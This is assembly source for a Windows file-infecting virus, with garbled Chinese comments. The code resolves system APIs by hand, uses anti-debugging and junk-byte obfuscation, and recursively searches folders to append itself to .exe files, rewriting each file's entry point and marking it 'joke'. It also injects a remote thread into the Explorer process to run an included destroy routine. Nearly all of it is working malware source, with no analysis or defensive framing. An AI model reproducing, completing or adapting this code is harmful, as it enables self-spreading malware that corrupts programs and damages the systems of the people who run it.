


Appendcode_Start LABEL		DWORD

	jmp	_NewEntry
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;��Ҫ�ĺ�������Ϊ����WIN7 kernelbase.dll������LoadLibraryExA����
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
szGetProcAddress	db	'GetProcAddress',0
szLoadLibraryA		db	'LoadLibraryA',0
szGetModuleHandleA	db	'GetModuleHandleA',0

lpGetProcAddress	dd	0
lpLoadLibraryA		dd	0
lpGetModuleHandleA	dd	0

;��Ҫ�õ���ģ����
_szHmoduleName	equ this byte
szKernel32	db	'kernel32.dll',0
szUser32	db	'user32.dll',0
		dd	0	;��һ��0����

;��Ҫ�õ���ģ���ַ
_lpHmodule	equ this byte
hKernel32	dd	0
hUser32		dd	0
		dd	0

;ģ���Ӧ�ĺ�����
_szFuncName	equ this byte
;kernel32
szFindFirstFileA	db 'FindFirstFileA',0
szFindNextFileA		db 'FindNextFileA',0
szFindClose		db 'FindClose',0
szCreateFileA		db 'CreateFileA',0
szWriteFile		db 'WriteFile',0
szSetFileAttributesA	db 'SetFileAttributesA',0
szCloseHandle		db 'CloseHandle',0
szSetFilePointer	db 'SetFilePointer',0
szCreateFileMappingA	db 'CreateFileMappingA',0
szMapViewOfFile		db 'MapViewOfFile',0
szUnmapViewOfFile	db 'UnmapViewOfFile',0
szSetEndOfFile		db 'SetEndOfFile',0
szGetTickCount		db 'GetTickCount',0
szCreateThread		db 'CreateThread',0
szSetCurrentDirectoryA	db 'SetCurrentDirectoryA',0
szGetCurrentDirectoryA	db 'GetCurrentDirectoryA',0
szGetWindowsDirectoryA	db 'GetWindowsDirectoryA',0
szGetSystemDirectoryA	db 'GetSystemDirectoryA',0
szlstrcpyA		db 'lstrcpyA',0
szlstrcatA		db 'lstrcatA',0
szlstrlenA		db 'lstrlenA',0
szReadFile		db 'ReadFile',0
szGetFileSize		db 'GetFileSize',0
szlstrcmpA		db 'lstrcmpA',0
szVirtualAllocEx	db 'VirtualAllocEx',0
szOpenProcess		db 'OpenProcess',0
szWriteProcessMemory	db 'WriteProcessMemory',0
szCreateRemoteThread	db 'CreateRemoteThread',0
			dd 0   ;һ�����ӿ⺯���Ľ���
;user32
szFindWindowA	        db 'FindWindowA',0
szShowWindow	        db 'ShowWindow',0
szEnableWindow	        db 'EnableWindow',0
szGetThreadProcessId	db 'GetWindowThreadProcessId',0
		        dd 0
		  
;������ַ�б�	
_lpFuncAddress	equ this byte
;kernel32
lpFindFirstFileA	dd	0
lpFindNextFileA		dd	0
lpFindClose		dd	0
lpCreateFileA		dd	0
lpWriteFile		dd	0
lpSetFileAttributesA	dd	0
lpCloseHandle		dd	0
lpSetFilePointer	dd	0
lpCreateFileMappingA	dd	0
lpMapViewOfFile		dd	0
lpUnmapViewOfFile	dd	0
lpSetEndOfFile		dd	0
lpGetTickCount		dd	0
lpCreateThread		dd	0
lpSetCurrentDirectoryA	dd	0
lpGetCurrentDirectoryA	dd	0
lpGetWindowsDirectoryA	dd	0
lpGetSystemDirectoryA	dd	0
lplstrcpyA		dd	0
lplstrcatA		dd	0
lplstrlenA		dd	0
lpReadFile		dd	0
lpGetFileSize		dd	0
lplstrcmpA		dd	0
lpVirtualAllocEx	dd	0
lpOpenProcess		dd	0
lpWriteProcessMemory	dd	0
lpCreateRemoteThread	dd	0
;user32
lpFindWindowA		dd	0
lpShowWindow		dd 	0
lpEnableWindow		dd	0
lpGetWindowThreadProcessId	dd	0
			dd	0 


MARK_OFFSET	equ	5bh		;����Ⱦ�ļ����λ��
mark		db	'joke',0	;�������
szFilter	db	'*.*',0
szEXE		db	'.exe',0
szSpreadPath	db	MAX_PATH dup(0) ;��������·��

MAX_COUNT	equ	4		;ÿ������Ⱦ�ļ���
dwFileCount	dd	0		;�Ѹ�Ⱦ�ļ���


;�߳�ע���õ��ı���
dwProcessID	dd	0
dwThreadID	dd	0
hProcess	dd	0
lpRemoteCode	dd	0

szDesktopClass	db	'Progman',0
szDesktopWindow	db	'Program Manager',0


;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;SEH����Handler
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_SEHHandler proc _lpExceptionRecord,_lpSEH,_lpContext,_lpDispatchertext
	pushad
	mov	esi,_lpExceptionRecord
	assume	esi:ptr EXCEPTIONRECORD
	mov	edi,_lpContext
	assume	edi:ptr CONTEXT
	mov	eax,_lpSEH
	push	[eax+0ch]
	pop	[edi].regEbp
	push	[eax+08]
	pop	[edi].regEip
	push	eax
	pop	[edi].regEsp
	assume	edi:nothing,esi:nothing
	popad
	mov	eax,ExceptionContinueExecution
	ret
_SEHHandler endp


;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;��ȡkernel32.dll����ַ,2�ֻ�ȡ��������ѡ��
;PS:��PEB��ȡ���ʹ��LoadLibraryExA�����Լ���WIN7
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_GetKernel32Base proc uses edi esi ebx _dwEsp
	call	@F
	@@:
	pop	ebx
	sub	ebx,offset @B

	;��װSEH;
	assume	fs:nothing
	push	ebp
	lea	eax, [ebx+offset _safeplace]
	push	eax
	lea	eax,[ebx + offset _SEHHandler]
	push	eax
	push	fs:[0]
	mov	fs:[0],esp

	mov	eax,_dwEsp
	and	eax,0ffff0000h

	.while	eax>=70000000h
		.if word ptr [eax] == IMAGE_DOS_SIGNATURE
			mov	edi,eax
			add	edi,[eax+03ch]
			.if word ptr [edi] == IMAGE_NT_SIGNATURE
				jmp	find
			.endif
		.endif
		_safeplace:
		sub	eax,10000h
	.endw
	mov	eax,0
	find:
	pop	fs:[0]
	add	esp,0ch
	ret
_GetKernel32Base endp

;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;��PEB��ȡ��ַ�ķ���
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;_GetKernel32Base proc
;	local	@dwRet

;	pushad
	
;	assume fs:nothing
;	mov eax,fs:[30h]	;��ȡPEB���ڵ�ַ
;	mov eax,[eax+0ch]	;��ȡPEB_LDR_DATA �ṹָ��
;	mov esi,[eax+1ch]	;��ȡInInitializationOrderModuleList ����ͷ
				;��һ��LDR_MODULE�ڵ�InInitializationOrderModuleList��Ա��ָ��
;	lodsd			;��ȡ˫������ǰ�ڵ��̵�ָ��
;	mov eax,[eax+8]		;��ȡkernel32.dll�Ļ���ַ
;	mov @dwRet,eax
;	popad
	
;	mov eax,@dwRet
;	ret
;_GetKernel32Base endp

;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;���ҵ������ȡ�ƶ�API��ַ
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

_antidebug:
	assume	fs:nothing
	mov	eax,fs:[30h]
	mov	eax,[eax+68h]
	and	eax,70h
	test	eax,eax
	jne	_isdebug
	add	dword ptr [esp],2
	_isdebug:
	ret

_GetApi	proc	_hModule,_lpszApi
	local	@dwReturn,@dwSize
	pushad
	
	call	@F
	@@:
	pop	ebx
	sub	ebx,@B
	
	assume	fs:nothing
	push	ebp
	push	[ebx+offset error]
	push	[ebx+offset _SEHHandler]
	push	fs:[0]
	mov	fs:[0],esp
	
	mov	edi,_lpszApi
	mov	ecx,-1
	xor	eax,eax
	cld
	repnz	scasb
	sub	edi,_lpszApi
	mov	@dwSize,edi

	mov	esi,_hModule
	add	esi,[esi+3ch]
	assume	esi:ptr IMAGE_NT_HEADERS
	mov	esi,[esi].OptionalHeader.DataDirectory.VirtualAddress
	add	esi,_hModule
	assume	esi:ptr IMAGE_EXPORT_DIRECTORY

	mov	ebx,[esi].AddressOfNames
	add	ebx,_hModule
	xor	edx,edx
	.while  edx <	[esi].NumberOfNames
		push	esi
		mov	edi,[ebx]
		add	edi,_hModule
		mov	esi,_lpszApi
		mov	ecx,@dwSize
		cld
		repz	cmpsb
		.if	!ecx
			pop	esi
			jmp	@F
		.endif
		next:
		pop	esi
		inc	edx
		add	ebx,4
	.endw
	jmp	error
	@@:
	sub	ebx,[esi].AddressOfNames
	sub	ebx,_hModule
	shr	ebx,1
	add	ebx,[esi].AddressOfNameOrdinals
	add	ebx,_hModule
	movzx	eax,word ptr [ebx]
	shl	eax,2
	add	eax,[esi].AddressOfFunctions
	add	eax,_hModule

	mov	eax,[eax]
	add	eax,_hModule
	mov	@dwReturn,eax
	error:
	pop	fs:[0]
	add	esp,0ch
	assume	esi:nothing
	popad
	mov	eax,@dwReturn
	ret
_GetApi endp

_GetAllDll	proc
	pushad

	call	@F
	@@:
	pop	ebx
	sub	ebx,@B
	lea	esi,dword ptr [ebx+offset _szHmoduleName]	;DLL���б�
	lea	edi,dword ptr [ebx+offset _lpHmodule]		;DLL��ַ�б�
	_GetNextDll:
	mov	eax,[esi]
	cmp	eax,0
	je	_FindAllDll
	push	esi
	call	dword ptr [ebx+offset lpGetModuleHandleA]
	cmp	eax,0
	jne	_ok
	push	esi
	call	dword ptr [ebx+offset lpLoadLibraryA]
	_ok:
	mov	dword ptr [edi],eax ;DLL���
	add	edi,4
	xchg	edi,esi
	mov	ecx,0ffffffffh
	xor	eax,eax
	repne	scasb
	xchg	edi,esi
	jmp	_GetNextDll
	_FindAllDll:

	popad
	xor	eax,eax
	ret
_GetAllDll	endp

_GetAllApi	proc
	
	pushad
	
	call	@F
	@@:
	pop	ebx
	sub	ebx,@B
	lea	edx,dword ptr [ebx+offset _lpHmodule]		;DLL��ַ�б�
	lea	esi,dword ptr [ebx+offset _szFuncName]		;�������б�
	lea	edi,dword ptr [ebx+offset _lpFuncAddress]	;������ַ�б�
	_GetNextDll:
	mov	ecx,[edx]
	cmp	ecx,0
	je	_FindAllDll
	_GetNextFunc:
		mov	eax,[esi]
		cmp	eax,0     ;��ý���
		je	_FindAllFunc
		push	edx
		push	esi
		push	dword ptr [edx]
		call	dword ptr [ebx+offset lpGetProcAddress]
		mov	dword ptr [edi],eax
		pop	edx

		mov	ecx,0ffffffffh
		xor	eax,eax
		xchg	esi,edi
		repne	scasb
		xchg	esi,edi
		add	edi,4
		jmp	_GetNextFunc
	_FindAllFunc:
	add	esi,4
	add	edx,4
	jmp	_GetNextDll
	_FindAllDll:
	popad
	xor	eax,eax
	ret
_GetAllApi	endp


_GetValidSize	proc	_lpFile,_lpSection
		local	@dwReturn
		pushad
		mov	esi,_lpSection
		assume	esi:ptr IMAGE_SECTION_HEADER
		mov	eax,[esi].SizeOfRawData
		mov	@dwReturn,eax
		mov	edi,[esi].PointerToRawData
		add	edi,[esi].SizeOfRawData
		dec	edi
		add	edi,_lpFile
		xor	eax,eax
		mov	ecx,0ffffffffh
		repne	scasb
		add	edi,8
		cmp	edi,0
		jle	_fail
		mov	eax,edi
		sub	eax,_lpFile
		sub	eax,[esi].PointerToRawData
		mov	@dwReturn,eax
		popad
		mov	eax,@dwReturn
		ret
		_fail:
		popad
		mov	eax,@dwReturn
		ret
_GetValidSize	endp

;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; ���㰴��ָ��ֵ��������ֵ
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_Align		proc	_dwSize,_dwAlign

		push	edx
		mov	eax,_dwSize
		xor	edx,edx
		div	_dwAlign
		.if	edx
			inc	eax
		.endif
		mul	_dwAlign
		pop	edx
		ret

_Align		endp

_infect	proc	_hFile,_dwFileSize
		local	@dwPatchSize,@dwFileAlignSize,@dwFinalSize,@lpMemory,@dwOldEntry,@dwRead,@dwReturn
		local	@dwSectionAlign,@dwFileAlign,@dwSectionNum,@lpSectionHeader,@lpPeHead,@hMapFile

		pushad
		call	@F
		@@:
		pop	ebx
		sub	ebx,@B

		push	0
		push	0
		push	0
		push	PAGE_READONLY
		push	0
		push	_hFile
		call	dword ptr [ebx+offset lpCreateFileMappingA]
		.if	eax
			mov	@hMapFile,eax
			push	0
			push	0
			push	0
			push	FILE_MAP_READ
			push	eax
			call	dword ptr [ebx+offset lpMapViewOfFile]
			.if	eax
				mov	@lpMemory,eax
				mov	esi,@lpMemory
				assume	esi:ptr IMAGE_DOS_HEADER
				add	esi,[esi].e_lfanew
				mov	@lpPeHead,esi
			.else
				push	@hMapFile
				call	dword ptr [ebx+offset lpCloseHandle]
				jmp	__exit
			.endif
		.else
			jmp	__exit
		.endif
		mov	@dwPatchSize,offset Appendcode_End - offset Appendcode_Start
		mov	esi,@lpPeHead
		assume	esi:ptr IMAGE_NT_HEADERS
		movzx	eax,[esi].FileHeader.NumberOfSections
		mov	@dwSectionNum,eax
		mov	eax,[esi].OptionalHeader.FileAlignment
		mov	@dwFileAlign,eax
		mov	eax,[esi].OptionalHeader.SectionAlignment
		mov	@dwSectionAlign,eax
		invoke	_Align,_dwFileSize,@dwFileAlign
		mov	@dwFileAlignSize,eax
		add	eax,@dwPatchSize
		invoke	_Align,eax,@dwFileAlign
		mov	@dwFinalSize,eax
		;�ر�ӳ��
		push	@lpMemory
		call	dword ptr [ebx+offset lpUnmapViewOfFile]
		push	@hMapFile
		call	dword ptr [ebx+offset lpCloseHandle]

		;���´�С����ӳ��
		push	0
		push	@dwFinalSize
		push	0
		push	PAGE_READWRITE
		push	0
		push	_hFile
		call	dword ptr [ebx+offset lpCreateFileMappingA]
		.if	eax
			mov	@hMapFile,eax
			push	@dwFinalSize
			push	0
			push	0
			push	FILE_MAP_ALL_ACCESS
			push	eax
			call	dword ptr [ebx+offset lpMapViewOfFile]
			.if	eax
				mov	@lpMemory,eax
				mov	esi,@lpMemory
				assume	esi:ptr IMAGE_DOS_HEADER
				add	esi,[esi].e_lfanew
				mov	@lpPeHead,esi
			.else
				push	@hMapFile
				call	dword ptr [ebx+offset lpCloseHandle]
				jmp	__exit
			.endif
		.else
			jmp	__exit
		.endif		
		;���Ʋ�������,����ǰ�����ļ�����
		push	dword ptr [ebx+offset dwFileCount]
		mov	dword ptr [ebx+offset dwFileCount],0
		mov	edi,@lpMemory
		add	edi,@dwFileAlignSize
		lea	esi,[ebx+offset Appendcode_Start]
		mov	ecx,@dwPatchSize
		rep	movsb
		;�ָ�����
		pop	dword ptr [ebx+offset dwFileCount]

		push	ebx
		;������ϣ���ʼ����PEͷ
		;mov	eax,@lpPeHead
		;sub	eax,@lpFile
		;mov	esi,@lpMemory
		;add	esi,eax
		mov	esi,@lpPeHead
		assume	esi:ptr IMAGE_NT_HEADERS
		mov	edi,esi
		add	edi,sizeof IMAGE_NT_HEADERS
		mov	eax,sizeof IMAGE_SECTION_HEADER
		mov	ebx,@dwSectionNum
		dec	ebx
		mul	ebx
		add	edi,eax
		mov	@lpSectionHeader,edi
		assume	edi:ptr IMAGE_SECTION_HEADER
		mov	eax,@dwFinalSize
		mov	ebx,[edi].PointerToRawData
		sub	eax,ebx;@dwFileAlignSize
		mov	[edi].SizeOfRawData,eax
		mov	ebx,[esi].OptionalHeader.AddressOfEntryPoint
		mov	@dwOldEntry,ebx
		add	eax,@dwPatchSize
		invoke	_GetValidSize,@lpMemory,@lpSectionHeader
		invoke	_Align,eax,@dwSectionAlign
		mov	[edi].Misc.VirtualSize,eax
		or	[edi].Characteristics,0e0000000h
		mov	eax,[edi].VirtualAddress
		add	eax,[edi].Misc.VirtualSize
		mov	[esi].OptionalHeader.SizeOfImage,eax
		mov	eax,[edi].VirtualAddress
		add	eax,@dwFileAlignSize
		sub	eax,[edi].PointerToRawData
		mov	[esi].OptionalHeader.AddressOfEntryPoint,eax
		add	eax,@dwPatchSize
		dec	eax
		mov	ecx,@dwOldEntry
		sub	ecx,eax
		mov	eax,@lpMemory
		add	eax,@dwFileAlignSize
		add	eax,@dwPatchSize
		sub	eax,5
		mov	dword ptr [eax],ecx
		pop	ebx

		;��Ӹ�Ⱦ��־
		mov	eax,@lpMemory
		add	eax,5bh
		mov	dword ptr [eax],656b6f6ah

		push	@lpMemory
		call	dword ptr [ebx+offset lpUnmapViewOfFile]
		push	@hMapFile
		call	dword ptr [ebx+offset lpCloseHandle]
	
		mov	@dwReturn,1
		jmp	__ok
		__exit:
		mov	@dwReturn,0
		__ok:
		popad
		mov	eax,@dwReturn
		ret
_infect	endp

;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; �����ҵ����ļ�,����Ⱦ4���ļ�
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_ProcessFile	proc	_lpszFile
		local	@hFile,@dwFileSize
		local	@mark,@temp,@dwAttribute
		
		pushad

		push	0
		push	FILE_ATTRIBUTE_NORMAL
		push	OPEN_EXISTING
		push	0
		push	FILE_SHARE_READ
		push	GENERIC_READ or GENERIC_WRITE
		push	_lpszFile
		call	dword ptr [ebx+offset lpCreateFileA]
		.if	eax !=	INVALID_HANDLE_VALUE
			mov	@hFile,eax
			;ȡ��־
			push	FILE_BEGIN
			push	0
			push	5bh
			push	eax
			call	dword ptr [ebx+offset lpSetFilePointer]
			push	0
			lea	eax,@temp
			push	eax
			push	4
			lea	eax,@mark
			push	eax
			push	@hFile
			call	dword ptr [ebx+offset lpReadFile]
			cmp	@mark,656b6f6ah
			je	_alread
			push	0
			push	@hFile
			call	dword ptr [ebx+offset lpGetFileSize]
			mov	@dwFileSize,eax
			;��ʼ��������
			push	@dwFileSize
			push	@hFile
			call	_infect   ;��Ⱦ
			cmp	eax,0
			je	_alread
			inc	dword ptr [ebx+offset dwFileCount]  ;���Ӹ�Ⱦ�ļ�����
			_alread:
			push	@hFile
			call	dword ptr [ebx+offset lpCloseHandle]
		.endif
		popad
		ret

_ProcessFile	endp

_EBFE:
mov	dword ptr [esp],0
dw	0FEEBh

;szz	db	'c:\123.exe',0  �������ļ�
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_FindFile	proc	_lpszPath
		local	@stFindFile:WIN32_FIND_DATA
		local	@hFindFile
		local	@szPath[MAX_PATH]:byte		;������š�·��\��
		local	@szSearch[MAX_PATH]:byte	;������š�·��\*.*��
		local	@szFindFile[MAX_PATH]:byte	;������š�·��\�ҵ����ļ���

		pushad
		call	@F
		@@:
		pop	ebx
		sub	ebx,@B

		push	_lpszPath
		lea	eax,@szPath
		push	eax
		call	dword ptr [ebx+offset lplstrcpyA]
;********************************************************************
; ��·���������\*.exe
;********************************************************************
		@@:
		lea	eax,@szPath
		push	eax
		call	dword ptr [ebx+lplstrlenA]
		lea	esi,@szPath
		add	esi,eax
		xor	eax,eax
		mov	al,'\'
		.if	byte ptr [esi-1] != al
			mov	word ptr [esi],ax
		.endif
		lea	eax,@szPath
		push	eax
		lea	eax,@szSearch
		push	eax
		call	dword ptr [ebx+offset lplstrcpyA]
		lea	eax,[ebx+offset szFilter]
		push	eax
		lea	eax,@szSearch
		push	eax
		call	dword ptr [ebx+offset lplstrcatA]    
;********************************************************************
; Ѱ���ļ�
;********************************************************************
		lea	eax,@stFindFile
		push	eax
		lea	eax,@szSearch
		push	eax
		call	dword ptr [ebx+offset lpFindFirstFileA]
		.if	eax !=	INVALID_HANDLE_VALUE
			mov	@hFindFile,eax
			.repeat
				lea	eax,@szPath
				push	eax
				lea	eax,@szFindFile
				push	eax
				call	dword ptr [ebx+offset lplstrcpyA]
				lea	eax,@stFindFile.cFileName
				push	eax
				lea	eax,@szFindFile
				push	eax
				call	dword ptr [ebx+offset lplstrcatA]
				.if	@stFindFile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY
					.if	@stFindFile.cFileName != '.'
						invoke	_FindFile,addr @szFindFile
					.endif
				.else
					cmp	dword ptr [ebx+offset dwFileCount],MAX_COUNT
					jge	_quit
					;����Ƿ���exe�ļ�,���򴫲�����
					lea	edx,@szFindFile
					push	edx
					push	edx
					call	dword ptr [ebx+lplstrlenA]
					pop	edx
					add	edx,eax
					sub	edx,4
					push	edx
					lea	eax,[ebx+offset szEXE]
					push	eax
					call	dword ptr [ebx+offset lplstrcmpA]
					cmp	eax,0
					jne	_p
						;������
						;lea	eax,[ebx+offset szz]
						;push	eax
						;lea	eax,@szFindFile
						;push	eax
						;call	dword ptr [ebx+offset lplstrcpyA]
						
						;�����ļ������Ա��
						push	80h
						lea	eax,@szFindFile
						push	eax
						call	dword ptr [ebx+offset lpSetFileAttributesA]
					
						invoke	_ProcessFile,addr @szFindFile
						
						;�ָ��ļ�����
						lea	eax,@stFindFile
						push	dword ptr [eax]
						lea	eax,@szFindFile
						push	eax
						call	dword ptr [ebx+offset lpSetFileAttributesA]
					
					_p:
				.endif
				lea	eax,@stFindFile
				push	eax
				push	@hFindFile
				call	dword ptr [ebx+offset lpFindNextFileA]
			.until	(eax ==	FALSE)
			push	@hFindFile
			call	dword ptr [ebx+offset lpFindClose]
		.endif
		_quit:
		popad
		ret

_FindFile	endp

include	destroy.asm

dd	45455500h,45856568h,6525626ah
_ANTI:
call	@F
@@:
pop	ebx
sub	ebx,@B
lea	eax,[ebx+401120]
push	eax
call	_EBFE

_start	proc
	local	@dwKernel32Base,@temp
	local	@lpGetProcAddress,@lpLoadLibraryA
	
	pushad
	push	edx
	call	_GetKernel32Base
	push	eax
	call	_antidebug
	jmp	_ANTI
	pop	eax
	.if	eax
		mov	@dwKernel32Base,eax
		lea	edx,dword ptr [ebx+offset szGetProcAddress]
		push	edx
		push	eax
		call	_GetApi
		je	@F
		jne	@F
		db	068h
		@@:
		mov	@lpGetProcAddress,eax
		mov	dword ptr [ebx+offset lpGetProcAddress],eax
	.endif
	.if	@lpGetProcAddress
		lea	edx,dword ptr [ebx+offset szLoadLibraryA]
		push	edx
		push	@dwKernel32Base
		call	@lpGetProcAddress
		.if	eax
			mov	@lpLoadLibraryA,eax
			mov	dword ptr [ebx+offset lpLoadLibraryA],eax
			call	_antidebug
			jmp	_ANTI
			lea	edx,dword ptr [ebx+offset szGetModuleHandleA]
			push	edx
			push	@dwKernel32Base
			call	@lpGetProcAddress
			cmp	eax,0
			je	_exit
			mov	dword ptr [ebx+offset lpGetModuleHandleA],eax
			call	_GetAllDll	;ȡ������ģ���ַ
			call	_GetAllApi	;ȡ������API������ַ
			;ȡ����������һ��Ŀ¼·��
			call	dword ptr [ebx+offset lpGetTickCount]
			mov	ecx,3h
			xor	edx,edx
			div	ecx

			;mov	edx,0 ;���ԣ���
			
			mov	eax,dword ptr [ebx+offset lpGetCurrentDirectoryA+edx*4]
			lea	ecx,[ebx+offset szSpreadPath]
			.if	edx 
				push	MAX_PATH
				push	ecx
				call	eax
			.else
				push	ecx
				push	MAX_PATH
				call	eax
			.endif
			;����һ���߳̽��в�������
			lea	edx,@temp
			push	edx
			push	0
			lea	edx,[ebx+offset szSpreadPath]
			push	edx				;�̲߳���ΪĿ¼·��
			lea	edx,dword ptr [ebx+offset _FindFile]
			push	edx
			push	0
			push	0
			call	dword ptr [ebx+offset lpCreateThread]	

			;�����ƻ�����,�ƻ�����ʹ��Զ���̣߳�Ϊ��ǿ������,һ��ʱ����ƻ��������������
			; �����ļ����������ڲ���ȡ����ID��Ȼ��򿪽���,���в�������ע��
			jmp	@F
			db	0h
			@@:
			lea	eax,[ebx+offset szDesktopWindow]
			push	eax
			lea	eax,[ebx+offset szDesktopClass]
			push	eax
			call	dword ptr [ebx+offset lpFindWindowA]
			lea	edx,[ebx+offset dwProcessID]
			push	edx
			push	eax
			jmp	@F
			dw	0FF25h
			@@:
			call	dword ptr [ebx+offset lpGetWindowThreadProcessId]
			mov	dword ptr [ebx+offset dwThreadID],eax
			push	dword ptr [ebx+offset dwProcessID]
			push	0
			push	PROCESS_CREATE_THREAD or PROCESS_VM_OPERATION or PROCESS_VM_WRITE
			call	dword ptr [ebx+offset lpOpenProcess]
			.if	eax
				mov	dword ptr [ebx+offset hProcess],eax
				push	PAGE_EXECUTE_READWRITE
				push	MEM_COMMIT
				push	REMOTE_CODE_LENGTH
				push	0
				push	dword ptr [ebx+offset hProcess]
				jz	@F
				jnz	@F
				db	0EBh
				@@:
				call	dword ptr [ebx+offset lpVirtualAllocEx]
				.if	eax
					mov	dword ptr [ebx+offset lpRemoteCode],eax
					push	0
					push	REMOTE_CODE_LENGTH
					lea	eax,[ebx+offset REMOTE_CODE_START]
					push	eax
					push	dword ptr [ebx+offset lpRemoteCode]
					push	dword ptr [ebx+offset hProcess]
					js	@F
					jns	@F
					db	0E9h
					@@:
					call	dword ptr [ebx+offset lpWriteProcessMemory]
					push	0
					push	0ch
					lea	eax,[ebx+offset lpGetProcAddress]
					push	eax
					push	dword ptr [ebx+offset lpRemoteCode]
					push	dword ptr [ebx+offset hProcess]
					call	dword ptr [ebx+offset lpWriteProcessMemory]
					
					mov	eax,dword ptr [ebx+offset lpRemoteCode]
					add	eax,offset _destroy - offset REMOTE_CODE_START
					push	0
					push	0
					push	0
					push	eax
					push	0
					push	0
					push	dword ptr [ebx+offset hProcess]
					jmp	@F
					db	0EBh
					@@:
					call	dword ptr [ebx+offset lpCreateRemoteThread]
					push	eax
					call	dword ptr [ebx+offset lpCloseHandle]
				.endif
				push	dword ptr [ebx+offset hProcess]
				call	dword ptr [ebx+offset lpCloseHandle]
			.endif
			;push	eax
			;push	@lpGetProcAddress
			;push	@dwKernel32Base
			;call	_Patch
		.endif
	.endif
	_exit:
	popad
	xor	eax,eax
	add	dword ptr [ebp+4],1
	ret
_start	endp

;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;PE�ļ������
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_NewEntry:
	call	@F
	@@:
	pop	ebx
	sub	ebx,@B
	mov	edx,[esp]
	js	@F
	jns	@F
	db	0EBh
	@@:
	call	_start
	;ret
	db	0E9h
	jmpToStart db 0E9h,0F0h,0FFh,0ffh,0ffh	;��Ҫ����
	ret

Appendcode_End LABEL		DWORD